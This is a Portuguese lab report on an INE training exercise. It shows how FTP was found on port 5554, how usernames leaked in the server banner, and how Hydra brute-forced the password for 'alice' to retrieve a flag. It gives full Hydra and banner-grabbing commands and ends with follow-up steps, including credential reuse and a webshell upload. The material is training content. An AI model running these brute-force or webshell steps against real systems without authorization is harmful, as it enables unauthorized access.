# 🧪 Lab Report — FTP em Porta Não-Padrão + Hydra Brute Force

> **Plataforma:** INE
> **Tema central:** FTP em porta não-padrão → OSINT via banner → wordlist manual → brute force com Hydra → extração de arquivo
> **Alvo:** `target.ine.local`

---

## 🎯 Objetivo

Identificar um serviço FTP rodando em porta não-padrão, extrair inteligência do próprio banner do servidor (usernames vazados), construir uma wordlist direcionada e usar o Hydra para obter credenciais válidas.

---

## 🧠 Insight Principal Deste Lab

> O servidor entregou os nomes de usuário no próprio banner de boas-vindas.
> Isso é **OSINT passivo** — informação sensível exposta sem nenhuma autenticação.

O banner dizia:
```
Reminder to users, specifically ashley, alice and amanda 
to change their weak passwords immediately!!!
```

Três usernames confirmados + aviso de senhas fracas = brute force trivial.

---

## 📋 Sumário de Etapas

| # | Ação | Ferramenta | Resultado |
|---|------|-----------|-----------|
| 1 | Scan porta padrão (21) | `ftp_version` | FTP não encontrado na 21 |
| 2 | Scan porta alternativa (5554) | `ftp_version` | Banner com 3 usernames |
| 3 | Criar wordlist de usuários | `echo` | `usersftp.txt` |
| 4 | Brute force na porta errada (21) | `hydra` | Falha — porta errada |
| 5 | Brute force na porta correta (5554) | `hydra` | `alice:pretty` |
| 6 | Login e download | `ftp` | `FLAG3{2c5c572d87b640fab30b9c71c8b20328}` |

---

## 🔬 Execução Passo a Passo

### Step 1 — Scan na Porta Padrão (Sem Resultado)

```bash
msfconsole -q

use auxiliary/scanner/ftp/ftp_version
set RHOSTS target.ine.local
run
```

**Resultado:**
```
[*] target.ine.local:21 - Scanned 1 of 1 hosts (100% complete)
```

Nenhum banner — porta 21 não tem FTP ativo.

**Lição:** FTP na porta padrão 21 é a primeira verificação. Mas serviços podem rodar em **qualquer porta**. Scan padrão do Nmap cobre top 1000 — se o serviço estiver em porta fora desse range, passa despercebido.

> 💡 Sempre verificar com `nmap -p-` (todas as 65535 portas) para não perder serviços em portas não-padrão.

---

### Step 2 — Identificar FTP na Porta Não-Padrão

```bash
set RPORT 5554
run
```

**Resultado:**
```
[+] 192.66.237.3:5554 - FTP Banner: '220 Welcome to blah FTP service. 
Reminder to users, specifically ashley, alice and amanda 
to change their weak passwords immediately!!!\r\n'
```

**Dois achados simultâneos:**

| Achado | Tipo | Valor |
|--------|------|-------|
| FTP ativo na porta 5554 | Técnico | Superfície de ataque confirmada |
| Usernames no banner | OSINT | ashley, alice, amanda |

**O banner como vetor de informação:**

Administradores frequentemente incluem mensagens nos banners pensando que só usuários legítimos vão ver. Na prática, qualquer ferramenta de scan lê o banner sem autenticação. Informações comuns vazadas em banners:
- Nomes de usuários
- Software e versão (CVEs)
- Nome da organização
- Avisos internos
- Endereços de email

---

### Step 3 — Criar Wordlist de Usuários

```bash
# Sair do msfconsole
exit

echo -e "ashley\namanda\nalice" > usersftp.txt
cat usersftp.txt
```

**Resultado:**
```
ashley
amanda
alice
```

**Por que criar uma wordlist direcionada em vez de usar uma genérica:**

| Abordagem | Usuários testados | Tempo | Ruído |
|-----------|-----------------|-------|-------|
| Wordlist genérica (`common_users.txt`) | ~1000+ | Alto | Alto |
| Wordlist direcionada (3 usuários) | 3 | Baixo | Mínimo |

Quando você tem os usernames confirmados, não há motivo para testar outros. O brute force fica 99% mais rápido e menos detectável.

**Sintaxe do `echo -e`:**
```bash
echo -e "usuario1\nusuario2\nusuario3"
# -e  → habilita interpretação de \n como nova linha
# \n  → newline — coloca cada usuário em linha separada
```

---

### Step 4 — Brute Force com Hydra (Erro de Porta)

#### ⚠️ Erros Documentados para Aprendizado

```bash
# ❌ ERRADO — sem especificar o alvo
hydra -L usersftp.txt -P unix_passwords.txt
# [ERROR] Invalid target definition!

# ❌ ERRADO — porta padrão 21, mas FTP está na 5554
hydra -L usersftp.txt -P unix_passwords.txt ftp://target.ine.local
# [ERROR] all children were disabled due too many connection errors
```

**Por que o segundo erro acontece:** O Hydra tentou conectar na porta 21 que não tem FTP. O servidor recusou todas as conexões → `too many connection errors` → Hydra desistiu.

**Lição:** Sempre confirmar a porta antes de rodar o Hydra. Conexões para porta errada geram erro silencioso que pode parecer problema de rede.

---

### Step 5 — Brute Force na Porta Correta

```bash
hydra -L usersftp.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
```

**Anatomia do comando Hydra:**

| Parte | Significado |
|-------|------------|
| `-L usersftp.txt` | Lista de usuários (L maiúsculo = arquivo) |
| `-P unix_passwords.txt` | Lista de senhas (P maiúsculo = arquivo) |
| `ftp://` | Protocolo alvo |
| `target.ine.local` | Host alvo |
| `:5554` | Porta não-padrão — **obrigatório especificar** |

**Flags úteis do Hydra que não foram usadas aqui:**

| Flag | Função |
|------|--------|
| `-l usuario` | Usuário único (l minúsculo) |
| `-p senha` | Senha única (p minúsculo) |
| `-t 4` | Threads paralelas (default=16, reduzir para ser mais silencioso) |
| `-vV` | Verbose — mostrar cada tentativa |
| `-f` | Parar no primeiro sucesso |
| `-o resultado.txt` | Salvar credenciais encontradas |
| `-s PORTA` | Alternativa para especificar porta |

**Resultado após ~7 minutos:**
```
[5554][ftp] host: target.ine.local   login: alice   password: pretty
1 of 1 target successfully completed, 1 valid password found
```

> 💡 3027 combinações testadas (3 usuários × 1009 senhas). A senha `pretty` estava na wordlist `unix_passwords.txt` — confirma que wordlists padrão do Metasploit cobrem senhas fracas comuns.

---

### Step 6 — Login FTP e Download do Arquivo

```bash
ftp target.ine.local 5554
```

```
Name: alice
Password: pretty
```

```bash
ftp> ls
ftp> get flag3.txt
ftp> exit
```

```bash
cat flag3.txt
```

**Nota sobre a porta no cliente FTP:** A sintaxe `ftp HOST PORTA` (com espaço) é a forma correta de especificar porta não-padrão no cliente FTP nativo. Algumas versões também aceitam `ftp HOST:PORTA`.

**Resultado:**
```
FLAG3{2c5c572d87b640fab30b9c71c8b20328}
```

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Porta real do FTP | 5554 (não-padrão) |
| Usernames do banner | ashley, alice, amanda |
| Credencial | `alice:pretty` |
| Arquivo extraído | `flag3.txt` |
| Flag | `FLAG3{2c5c572d87b640fab30b9c71c8b20328}` |

---

## 🧠 Conceitos Consolidados

### Portas Não-Padrão — Por Que Existem e Como Encontrar

Administradores movem serviços para portas não-padrão como "security by obscurity" — a ideia é que atacantes não vão encontrar. Na prática:

```bash
# Scan completo — encontra qualquer porta
sudo nmap -p- -T4 IP

# Scan rápido das top 1000 (pode perder porta 5554)
nmap IP

# Scan com versão em range específico
nmap -sV -p 5000-6000 IP
```

Security by obscurity não é segurança — apenas aumenta levemente o tempo de descoberta.

---

### Banner Grabbing — Extração de OSINT Passivo

O banner é a primeira mensagem que o servidor envia após conexão TCP. Pode ser lido **sem autenticação**:

```bash
# Via Nmap
nmap --script ftp-banner -p 5554 IP

# Via netcat
nc -nv IP 5554

# Via Metasploit
use auxiliary/scanner/ftp/ftp_version
set RPORT 5554
```

**O que procurar em banners:**
- Nomes de usuários (como neste lab)
- Versão do software → CVEs
- Nome da organização → OSINT adicional
- Avisos internos → topologia, políticas

---

### Hydra — Diferença entre Maiúsculo e Minúsculo

```bash
# -l (minúsculo) = um usuário específico
hydra -l alice -P passwords.txt ftp://IP:5554

# -L (maiúsculo) = arquivo com lista de usuários
hydra -L users.txt -P passwords.txt ftp://IP:5554

# -p (minúsculo) = uma senha específica
hydra -L users.txt -p pretty ftp://IP:5554

# -P (maiúsculo) = arquivo com lista de senhas
hydra -L users.txt -P passwords.txt ftp://IP:5554
```

---

### Três Protocolos de Transferência — Sintaxe no Hydra

```bash
hydra -L users.txt -P pass.txt ftp://IP:PORTA
hydra -L users.txt -P pass.txt ssh://IP:PORTA
hydra -L users.txt -P pass.txt smb://IP
hydra -L users.txt -P pass.txt http-get://IP/path
hydra -L users.txt -P pass.txt mysql://IP
```

---

## 🔁 Próximos Passos Lógicos

```
alice:pretty obtida
        ↓
Testar mesma credencial em outros serviços do alvo
ssh alice@IP / ftp alice@IP em outras portas
        ↓
Verificar outros usuários (ashley, amanda)
hydra -l ashley -P passwords.txt ftp://IP:5554
hydra -l amanda -P passwords.txt ftp://IP:5554
        ↓
Verificar permissão de escrita no FTP
ftp> put teste.txt → erro ou sucesso
        ↓
Se HTTP ativo → upload de webshell via FTP
```

---

## 📌 Relacionados

- [[FTP — File Transfer Protocol]]
- [[FTP Enumeration com Metasploit]]
- [[Nmap — Port Scanning]]
- [[Nmap — Service & OS Detection]]
- [[Metasploit — Fundamentos e Arquitetura]]

#lab #exploração #protocolo/ftp #brute-force #ferramenta/hydra #porta-nao-padrao
